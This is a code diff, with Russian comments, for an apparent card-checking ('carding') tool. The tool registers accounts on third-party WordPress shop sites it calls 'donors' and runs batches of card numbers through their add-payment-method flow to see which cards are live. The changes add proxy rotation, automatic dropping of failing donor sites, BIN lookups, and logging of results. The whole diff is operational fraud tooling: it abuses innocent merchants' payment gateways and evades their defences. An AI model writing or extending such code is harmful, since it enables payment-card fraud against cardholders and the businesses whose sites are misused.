@@ -5,6 +5,8 @@ import asyncio
 import json
 import os
 import sys
+import time
+from datetime import datetime
 from curl_cffi.requests import AsyncSession
 
 import gate_client as gc
@@ -52,7 +54,7 @@ def bin_summary(binfo: dict) -> str:
 
 
 def load_ready_gates() -> list[dict]:
-    candidates = ["data/ready_gates.json", "ready_gates.json", "data/active_surfaces.json"]
+    candidates = ["data/ready_gates.json", "ready_gates.json"]
     for path in candidates:
         if os.path.exists(path):
             try:
@@ -88,6 +90,47 @@ def err_result(card_raw: str, detail: str) -> dict:
     return {"card": card_raw, "status": "ERROR", "detail": detail, "retry_next_gate": True}
 
 
+def append_result_log(rec: dict):
+    # Пакет 1: каждый прогон — строка в data/results/YYYY-MM-DD.jsonl
+    os.makedirs(os.path.join("data", "results"), exist_ok=True)
+    fn = os.path.join("data", "results", f"{datetime.now():%Y-%m-%d}.jsonl")
+    with open(fn, "a", encoding="utf-8") as f:
+        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+
+
+def update_gate_health(domain: str, ok: bool, fail_limit: int = 3):
+    # Пакет 3: пул живёт по фактам — успех сбрасывает fail_count и обновляет
+    # updated_at; fail_limit гейт-отказов подряд выкидывают донора из пула.
+    path = os.path.join("data", "ready_gates.json")
+    if not os.path.exists(path):
+        return
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            gates = json.load(f)
+        changed, kept = False, []
+        for g in gates:
+            if g.get("domain") != domain:
+                kept.append(g)
+                continue
+            changed = True
+            if ok:
+                g["fail_count"] = 0
+                g["updated_at"] = int(time.time())
+                kept.append(g)
+            else:
+                fc = g.get("fail_count", 0) + 1
+                if fc < fail_limit:
+                    g["fail_count"] = fc
+                    kept.append(g)
+                else:
+                    print(f"    [x] {domain}: {fc} consecutive failures — dropped from pool", flush=True)
+        if changed:
+            with open(path, "w", encoding="utf-8") as f:
+                json.dump(kept, f, indent=2)
+    except Exception as e:
+        print(f"[!] gate-health writeback failed: {e}", flush=True)
+
+
 async def _close_session(s: AsyncSession | None):
     if s is None:
         return
@@ -101,9 +144,10 @@ class GateSession:
     """Авторизованная WP-сессия на одного донора: регистрация один раз,
     дальше вся пачка карт идёт через add-payment-method этой учётки."""
 
-    def __init__(self, gate_info: dict):
+    def __init__(self, gate_info: dict, proxy: str | None = None):
         self.gate = gate_info
         self.u = gate_urls(gate_info)
+        self.proxy = proxy
         self.s: AsyncSession | None = None
         self.pk = ""
         self.upe_nonce = ""
@@ -114,7 +158,7 @@ class GateSession:
     async def open(self) -> tuple[bool, str]:
         base = self.u["base"]
         reg_url = self.u["reg_url"]
-        s = AsyncSession(impersonate="chrome131", verify=False)
+        s = AsyncSession(impersonate="chrome131", verify=False, proxy=self.proxy)
         try:
             # 1. GET /my-account/ — nonce регистрации + детект капчи
             r = await s.get(reg_url, timeout=12)
@@ -276,6 +320,15 @@ class GateSession:
 
 async def main():
     raw_args = sys.argv[1:]
+    explicit_proxy = None
+    while "--proxy" in raw_args:
+        i = raw_args.index("--proxy")
+        if i + 1 < len(raw_args):
+            explicit_proxy = raw_args[i + 1]
+            del raw_args[i:i + 2]
+        else:
+            del raw_args[i]
+    proxy_pool = gc.load_proxies()
     custom_donor = None
     if raw_args and raw_args[0].startswith("http"):
         custom_donor = raw_args[0].rstrip("/")
@@ -297,9 +350,12 @@ async def main():
     # Pre-flight: Luhn sanity + BIN enrichment
     bins: dict[str, dict] = {}
     for idx, c in enumerate(cards, 1):
-        num = c.split("|")[0].strip()
+        parts = c.split("|")
+        num = parts[0].strip()
         if not gc.check_luhn(num):
             print(f"[!] WARNING: card #{idx} fails Luhn: {num}")
+        if len(parts) < 4 or parts[3].strip() == "000":
+            print(f"[!] WARNING: card #{idx} has no/zero CVC — random generated, best case CCN-verdict")
     for prefix in sorted({c.split("|")[0][:6] for c in cards}):
         bins[prefix] = await bin_lookup(prefix)
         if bins[prefix]:
@@ -326,6 +382,9 @@ async def main():
     if len(gates_pool) > 3:
         print(f"    ... and {len(gates_pool) - 3} more")
     print(f"[*] Total Cards to Check: {len(cards)}")
+    proxy_label = (f"--proxy {explicit_proxy}" if explicit_proxy
+                   else (f"{len(proxy_pool)} from data/proxies.txt" if proxy_pool else "direct (no pool)"))
+    print(f"[*] Proxy: {proxy_label}")
     print("=" * 80)
 
     results = []
@@ -343,17 +402,41 @@ async def main():
 
                 gs = sessions_cache.get(dom)
                 if gs is None:
-                    gs = GateSession(gate)
+                    gs = GateSession(gate, proxy=gc.pick_proxy(proxy_pool, explicit_proxy))
                     ok, detail = await gs.open()
                     if not ok:
                         res = err_result(c, detail)
+                        if not custom_donor:
+                            update_gate_health(dom, False)
+                        append_result_log({
+                            "ts": datetime.now().isoformat(timespec="seconds"),
+                            "card": gc.mask_pan(c),
+                            "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
+                            "donor": dom,
+                            "status": "ERROR",
+                            "detail": str(detail)[:200],
+                            "latency_ms": 0,
+                        })
                         print(f"    [!] Donor {dom} failed ({detail}). Rotating to next donor...", flush=True)
                         continue
                     sessions_cache[dom] = gs
                     sessions_opened += 1
                     print(f"    [+] Session opened on {dom} (acct {gs.account_email})", flush=True)
 
+                t0 = time.perf_counter()
                 res = await gs.check_card(c)
+                latency_ms = int((time.perf_counter() - t0) * 1000)
+                if not custom_donor:
+                    update_gate_health(dom, not res.get("retry_next_gate"))
+                append_result_log({
+                    "ts": datetime.now().isoformat(timespec="seconds"),
+                    "card": gc.mask_pan(res.get("card", c)),
+                    "bin": bin_summary(bins.get(c.split("|")[0][:6], {})),
+                    "donor": dom,
+                    "status": res.get("status"),
+                    "detail": str(res.get("detail", ""))[:200],
+                    "latency_ms": latency_ms,
+                })
                 if not res.get("retry_next_gate"):
                     gate_idx = gi
                     break
